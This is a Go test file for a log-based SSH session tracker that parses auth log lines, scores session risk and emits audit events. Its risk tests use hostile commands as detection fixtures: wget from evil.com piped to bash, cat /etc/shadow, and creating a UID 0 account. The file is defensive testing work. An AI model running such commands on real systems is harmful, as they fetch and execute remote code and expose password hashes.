package session

import (
	"encoding/json"
	"testing"
	"time"
)

// --- Parser tests ---

func TestParseSSHLogin(t *testing.T) {
	line := "Aug 18 12:00:00 server sshd[12345]: Accepted password for root from 192.168.1.100 port 52412 ssh2"
	pl := ParseLine(line)
	if pl == nil {
		t.Fatal("expected ParsedLine, got nil")
	}
	if pl.Type != SSHLogin {
		t.Errorf("Type: got %d, want %d (SSHLogin)", pl.Type, SSHLogin)
	}
	if pl.User != "root" {
		t.Errorf("User: got %q, want %q", pl.User, "root")
	}
	if pl.IP != "192.168.1.100" {
		t.Errorf("IP: got %q, want %q", pl.IP, "192.168.1.100")
	}
	if pl.Port != 52412 {
		t.Errorf("Port: got %d, want %d", pl.Port, 52412)
	}
	if pl.Method != "password" {
		t.Errorf("Method: got %q, want %q", pl.Method, "password")
	}
	if pl.PID != "12345" {
		t.Errorf("PID: got %q, want %q", pl.PID, "12345")
	}
}

func TestParseSSHLoginPubkey(t *testing.T) {
	line := "Aug 18 12:00:00 server sshd[99]: Accepted publickey for deploy from 10.0.0.5 port 33221 ssh2"
	pl := ParseLine(line)
	if pl == nil {
		t.Fatal("expected ParsedLine, got nil")
	}
	if pl.Type != SSHLogin {
		t.Errorf("Type: got %d, want SSHLogin", pl.Type)
	}
	if pl.Method != "publickey" {
		t.Errorf("Method: got %q, want %q", pl.Method, "publickey")
	}
	if pl.User != "deploy" {
		t.Errorf("User: got %q, want %q", pl.User, "deploy")
	}
	if pl.IP != "10.0.0.5" {
		t.Errorf("IP: got %q, want %q", pl.IP, "10.0.0.5")
	}
	if pl.PID != "99" {
		t.Errorf("PID: got %q, want %q", pl.PID, "99")
	}
}

func TestParseSSHLogout(t *testing.T) {
	line := "Aug 18 12:01:00 server sshd[12345]: pam_unix(sshd:session): session closed for user root"
	pl := ParseLine(line)
	if pl == nil {
		t.Fatal("expected ParsedLine, got nil")
	}
	if pl.Type != SSHLogout {
		t.Errorf("Type: got %d, want %d (SSHLogout)", pl.Type, SSHLogout)
	}
	if pl.User != "root" {
		t.Errorf("User: got %q, want %q", pl.User, "root")
	}
	if pl.PID != "12345" {
		t.Errorf("PID: got %q, want %q", pl.PID, "12345")
	}
}

func TestParseSudo(t *testing.T) {
	line := "Aug 18 12:00:30 server sudo: admin : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/apt update"
	pl := ParseLine(line)
	if pl == nil {
		t.Fatal("expected ParsedLine, got nil")
	}
	if pl.Type != Sudo {
		t.Errorf("Type: got %d, want %d (Sudo)", pl.Type, Sudo)
	}
	if pl.User != "admin" {
		t.Errorf("User: got %q, want %q", pl.User, "admin")
	}
	if pl.TTY != "pts/0" {
		t.Errorf("TTY: got %q, want %q", pl.TTY, "pts/0")
	}
	if pl.PWD != "/root " {
		// PWD may have trailing space from the regex capture — normalize
		if pl.PWD != "/root" {
			t.Errorf("PWD: got %q, want %q", pl.PWD, "/root")
		}
	}
	if pl.TargetUser != "root" {
		t.Errorf("TargetUser: got %q, want %q", pl.TargetUser, "root")
	}
	if pl.Command != "/usr/bin/apt update" {
		t.Errorf("Command: got %q, want %q", pl.Command, "/usr/bin/apt update")
	}
}

func TestParseUseradd(t *testing.T) {
	line := "Aug 18 12:02:00 server useradd[5678]: new user: name=hacker, UID=0, GID=0, home=/root, shell=/bin/bash"
	pl := ParseLine(line)
	if pl == nil {
		t.Fatal("expected ParsedLine, got nil")
	}
	if pl.Type != Useradd {
		t.Errorf("Type: got %d, want %d (Useradd)", pl.Type, Useradd)
	}
	if pl.Details["name"] != "hacker" {
		t.Errorf("Details[name]: got %q, want %q", pl.Details["name"], "hacker")
	}
	if pl.Details["UID"] != "0" {
		t.Errorf("Details[UID]: got %q, want %q", pl.Details["UID"], "0")
	}
	if pl.Details["GID"] != "0" {
		t.Errorf("Details[GID]: got %q, want %q", pl.Details["GID"], "0")
	}
	if pl.Details["home"] != "/root" {
		t.Errorf("Details[home]: got %q, want %q", pl.Details["home"], "/root")
	}
	if pl.Details["shell"] != "/bin/bash" {
		t.Errorf("Details[shell]: got %q, want %q", pl.Details["shell"], "/bin/bash")
	}
}

func TestParseUserdel(t *testing.T) {
	line := "Aug 18 12:03:00 server userdel[5679]: delete user 'testuser'"
	pl := ParseLine(line)
	if pl == nil {
		t.Fatal("expected ParsedLine, got nil")
	}
	if pl.Type != Userdel {
		t.Errorf("Type: got %d, want %d (Userdel)", pl.Type, Userdel)
	}
	if pl.User != "testuser" {
		t.Errorf("User: got %q, want %q", pl.User, "testuser")
	}
}

func TestParsePasswd(t *testing.T) {
	line := "Aug 18 12:04:00 server passwd: pam_unix(passwd:chauthtok): password changed for www-data"
	pl := ParseLine(line)
	if pl == nil {
		t.Fatal("expected ParsedLine, got nil")
	}
	if pl.Type != Passwd {
		t.Errorf("Type: got %d, want %d (Passwd)", pl.Type, Passwd)
	}
	if pl.User != "www-data" {
		t.Errorf("User: got %q, want %q", pl.User, "www-data")
	}
}

func TestParseCrontab(t *testing.T) {
	line := "Aug 18 12:05:00 server crontab[9999]: (root) REPLACE"
	pl := ParseLine(line)
	if pl == nil {
		t.Fatal("expected ParsedLine, got nil")
	}
	if pl.Type != Crontab {
		t.Errorf("Type: got %d, want %d (Crontab)", pl.Type, Crontab)
	}
	if pl.User != "root" {
		t.Errorf("User: got %q, want %q", pl.User, "root")
	}
	if pl.PID != "9999" {
		t.Errorf("PID: got %q, want %q", pl.PID, "9999")
	}
}

func TestParseSu(t *testing.T) {
	line := "Aug 18 12:06:00 server su: pam_unix(su:session): session opened for user root by admin(uid=1000)"
	pl := ParseLine(line)
	if pl == nil {
		t.Fatal("expected ParsedLine, got nil")
	}
	if pl.Type != Su {
		t.Errorf("Type: got %d, want %d (Su)", pl.Type, Su)
	}
	if pl.User != "root" {
		t.Errorf("User: got %q, want %q", pl.User, "root")
	}
	if pl.ByUser != "admin" {
		t.Errorf("ByUser: got %q, want %q", pl.ByUser, "admin")
	}
}

func TestParseNoMatch(t *testing.T) {
	line := "some random log line that matches nothing"
	pl := ParseLine(line)
	if pl != nil {
		t.Errorf("expected nil, got %+v", pl)
	}
}

// --- Risk scoring tests ---

func TestRiskPasswordAuth(t *testing.T) {
	data := SessionData{
		AuthMethod: "password",
		IP:         "10.0.0.1",
		User:       "root",
		LoginHour:  14, // mid-day, no night bonus
		KnownIPs:   map[string]bool{"10.0.0.1": true},
	}
	r := CalculateRisk(data)
	hasPasswordAuth := false
	for _, f := range r.Factors {
		if f == "password_auth" {
			hasPasswordAuth = true
		}
	}
	if !hasPasswordAuth {
		t.Errorf("expected factor 'password_auth', got %v", r.Factors)
	}
	if r.Score < 15 {
		t.Errorf("expected score >= 15, got %d", r.Score)
	}
}

func TestRiskUnknownIP(t *testing.T) {
	data := SessionData{
		AuthMethod: "publickey",
		IP:         "1.2.3.4",
		User:       "root",
		LoginHour:  14,
		KnownIPs:   map[string]bool{},
	}
	r := CalculateRisk(data)
	hasUnknownIP := false
	for _, f := range r.Factors {
		if f == "unknown_ip" {
			hasUnknownIP = true
		}
	}
	if !hasUnknownIP {
		t.Errorf("expected factor 'unknown_ip', got %v", r.Factors)
	}
	if r.Score < 20 {
		t.Errorf("expected score >= 20, got %d", r.Score)
	}
}

func TestRiskNightHours(t *testing.T) {
	data := SessionData{
		AuthMethod: "publickey",
		IP:         "10.0.0.1",
		User:       "root",
		LoginHour:  3, // 3 AM
		KnownIPs:   map[string]bool{"10.0.0.1": true},
	}
	r := CalculateRisk(data)
	hasNight := false
	for _, f := range r.Factors {
		if f == "night_login" {
			hasNight = true
		}
	}
	if !hasNight {
		t.Errorf("expected factor 'night_login', got %v", r.Factors)
	}
	if r.Score < 10 {
		t.Errorf("expected score >= 10, got %d", r.Score)
	}
}

func TestRiskDangerousCommands(t *testing.T) {
	tests := []struct {
		name           string
		cmd            CommandEntry
		expectedFactor string
		minScore       int
	}{
		{
			name:           "cat /etc/shadow",
			cmd:            CommandEntry{Type: "sudo", Command: "cat /etc/shadow"},
			expectedFactor: "sensitive_file_read",
			minScore:       30,
		},
		{
			name:           "useradd UID=0",
			cmd:            CommandEntry{Type: "useradd", Command: "useradd", Details: map[string]string{"UID": "0"}},
			expectedFactor: "root_user_creation",
			minScore:       25,
		},
		{
			name:           "wget pipe bash",
			cmd:            CommandEntry{Type: "sudo", Command: "wget http://evil.com/x.sh | bash"},
			expectedFactor: "remote_code_exec",
			minScore:       30,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			data := SessionData{
				AuthMethod: "publickey",
				IP:         "10.0.0.1",
				User:       "root",
				LoginHour:  14,
				KnownIPs:   map[string]bool{"10.0.0.1": true},
				Commands:   []CommandEntry{tc.cmd},
			}
			r := CalculateRisk(data)
			hasFactor := false
			for _, f := range r.Factors {
				if f == tc.expectedFactor {
					hasFactor = true
				}
			}
			if !hasFactor {
				t.Errorf("expected factor %q, got %v", tc.expectedFactor, r.Factors)
			}
			if r.Score < tc.minScore {
				t.Errorf("expected score >= %d, got %d", tc.minScore, r.Score)
			}
		})
	}
}

func TestRiskSigmaAlert(t *testing.T) {
	data := SessionData{
		AuthMethod:  "publickey",
		IP:          "10.0.0.1",
		User:        "root",
		LoginHour:   14,
		KnownIPs:    map[string]bool{"10.0.0.1": true},
		SigmaAlerts: 1,
	}
	r := CalculateRisk(data)
	hasSigma := false
	for _, f := range r.Factors {
		if f == "sigma_correlation" {
			hasSigma = true
		}
	}
	if !hasSigma {
		t.Errorf("expected factor 'sigma_correlation', got %v", r.Factors)
	}
	if r.Score < 40 {
		t.Errorf("expected score >= 40, got %d", r.Score)
	}
}

func TestRiskScoreCappedAt100(t *testing.T) {
	data := SessionData{
		AuthMethod:  "password",
		IP:          "1.2.3.4",
		User:        "root",
		LoginHour:   3,
		KnownIPs:    map[string]bool{},
		SigmaAlerts: 5,
		Commands: []CommandEntry{
			{Type: "sudo", Command: "cat /etc/shadow"},
			{Type: "sudo", Command: "wget http://evil.com | bash"},
			{Type: "useradd", Command: "useradd", Details: map[string]string{"UID": "0"}},
		},
	}
	r := CalculateRisk(data)
	if r.Score > 100 {
		t.Errorf("score must be capped at 100, got %d", r.Score)
	}
}

// --- SessionConfig JSON test ---

func TestSessionConfigJSON(t *testing.T) {
	type wrapper struct {
		SessionConfig *SessionConfig `json:"session_config,omitempty"`
	}

	orig := wrapper{
		SessionConfig: &SessionConfig{Enabled: true},
	}

	b, err := json.Marshal(orig)
	if err != nil {
		t.Fatalf("marshal error: %v", err)
	}

	var decoded wrapper
	if err := json.Unmarshal(b, &decoded); err != nil {
		t.Fatalf("unmarshal error: %v", err)
	}

	if decoded.SessionConfig == nil {
		t.Fatal("decoded SessionConfig is nil")
	}
	if !decoded.SessionConfig.Enabled {
		t.Errorf("expected Enabled=true, got false")
	}
}

// --- SessionTracker lifecycle tests ---

func TestSessionLifecycle(t *testing.T) {
	var events []struct {
		eventType string
		severity  string
		details   map[string]string
	}

	tracker := New(func(eventType, severity string, details map[string]string) {
		events = append(events, struct {
			eventType string
			severity  string
			details   map[string]string
		}{eventType, severity, details})
	})
	tracker.UpdateConfig(Config{Enabled: true})

	// SSH login
	tracker.processLine("Aug 18 12:00:00 server sshd[42]: Accepted password for admin from 1.2.3.4 port 22222 ssh2")
	// Sudo command
	tracker.processLine("Aug 18 12:00:30 server sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/apt update")
	// SSH logout
	tracker.processLine("Aug 18 12:01:00 server sshd[42]: pam_unix(sshd:session): session closed for user admin")

	// Find the ssh_session event
	var sessionEvent *struct {
		eventType string
		severity  string
		details   map[string]string
	}
	for i := range events {
		if events[i].eventType == "ssh_session" {
			sessionEvent = &events[i]
			break
		}
	}

	if sessionEvent == nil {
		t.Fatalf("no ssh_session event emitted; events: %+v", events)
	}
	if sessionEvent.details["user"] != "admin" {
		t.Errorf("user: got %q, want %q", sessionEvent.details["user"], "admin")
	}
	if sessionEvent.details["ip"] != "1.2.3.4" {
		t.Errorf("ip: got %q, want %q", sessionEvent.details["ip"], "1.2.3.4")
	}
	if sessionEvent.details["command_count"] != "1" {
		t.Errorf("command_count: got %q, want %q", sessionEvent.details["command_count"], "1")
	}
	if sessionEvent.details["close_reason"] != "logout" {
		t.Errorf("close_reason: got %q, want %q", sessionEvent.details["close_reason"], "logout")
	}
}

func TestSessionTimeout(t *testing.T) {
	var events []struct {
		eventType string
		details   map[string]string
	}

	tracker := New(func(eventType, severity string, details map[string]string) {
		events = append(events, struct {
			eventType string
			details   map[string]string
		}{eventType, details})
	})
	tracker.UpdateConfig(Config{Enabled: true})

	// SSH login
	tracker.processLine("Aug 18 12:00:00 server sshd[77]: Accepted publickey for root from 5.5.5.5 port 33333 ssh2")

	// Manually age the session to simulate 24h+ elapsed
	tracker.mu.Lock()
	for pid, sess := range tracker.sessions {
		sess.LoginAt = time.Now().Add(-25 * time.Hour)
		tracker.sessions[pid] = sess
	}
	tracker.mu.Unlock()

	// Run cleanup
	tracker.cleanupSessions()

	// Check for timeout event
	found := false
	for _, e := range events {
		if e.eventType == "ssh_session" && e.details["close_reason"] == "timeout" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected ssh_session event with close_reason=timeout, events: %+v", events)
	}
}

func TestSystemAuditEmitted(t *testing.T) {
	var events []struct {
		eventType string
		details   map[string]string
	}

	tracker := New(func(eventType, severity string, details map[string]string) {
		events = append(events, struct {
			eventType string
			details   map[string]string
		}{eventType, details})
	})
	tracker.UpdateConfig(Config{Enabled: true})

	tracker.processLine("Aug 18 12:00:00 server useradd[111]: new user: name=attacker, UID=0, GID=0, home=/home/attacker, shell=/bin/bash")

	found := false
	for _, e := range events {
		if e.eventType == "system_audit" && e.details["operation"] == "useradd" {
			if e.details["name"] == "attacker" && e.details["uid"] == "0" {
				found = true
			}
		}
	}
	if !found {
		t.Errorf("expected system_audit useradd event, got: %+v", events)
	}
}

func TestDisabledNoEvents(t *testing.T) {
	var events []string
	tracker := New(func(eventType, severity string, details map[string]string) {
		events = append(events, eventType)
	})
	tracker.UpdateConfig(Config{Enabled: false})

	tracker.processLine("Aug 18 12:00:00 server sshd[88]: Accepted password for root from 9.9.9.9 port 22 ssh2")
	tracker.processLine("Aug 18 12:00:30 server useradd[89]: new user: name=x, UID=1001, GID=1001, home=/home/x, shell=/bin/sh")
	tracker.processLine("Aug 18 12:01:00 server sshd[88]: pam_unix(sshd:session): session closed for user root")

	if len(events) > 0 {
		t.Errorf("expected no events when disabled, got: %v", events)
	}
}

func TestMultipleSessions(t *testing.T) {
	var sessionEvents []map[string]string

	tracker := New(func(eventType, severity string, details map[string]string) {
		if eventType == "ssh_session" {
			sessionEvents = append(sessionEvents, details)
		}
	})
	tracker.UpdateConfig(Config{Enabled: true})

	// Two logins with different PIDs
	tracker.processLine("Aug 18 12:00:00 server sshd[100]: Accepted password for user1 from 1.1.1.1 port 11111 ssh2")
	tracker.processLine("Aug 18 12:00:05 server sshd[200]: Accepted publickey for user2 from 2.2.2.2 port 22222 ssh2")

	// Logout session 100
	tracker.processLine("Aug 18 12:01:00 server sshd[100]: pam_unix(sshd:session): session closed for user user1")

	// Only one ssh_session event emitted
	if len(sessionEvents) != 1 {
		t.Fatalf("expected 1 ssh_session event, got %d", len(sessionEvents))
	}
	if sessionEvents[0]["user"] != "user1" {
		t.Errorf("expected user1, got %q", sessionEvents[0]["user"])
	}

	// Logout session 200
	tracker.processLine("Aug 18 12:02:00 server sshd[200]: pam_unix(sshd:session): session closed for user user2")

	if len(sessionEvents) != 2 {
		t.Fatalf("expected 2 ssh_session events, got %d", len(sessionEvents))
	}
	if sessionEvents[1]["user"] != "user2" {
		t.Errorf("expected user2, got %q", sessionEvents[1]["user"])
	}
}
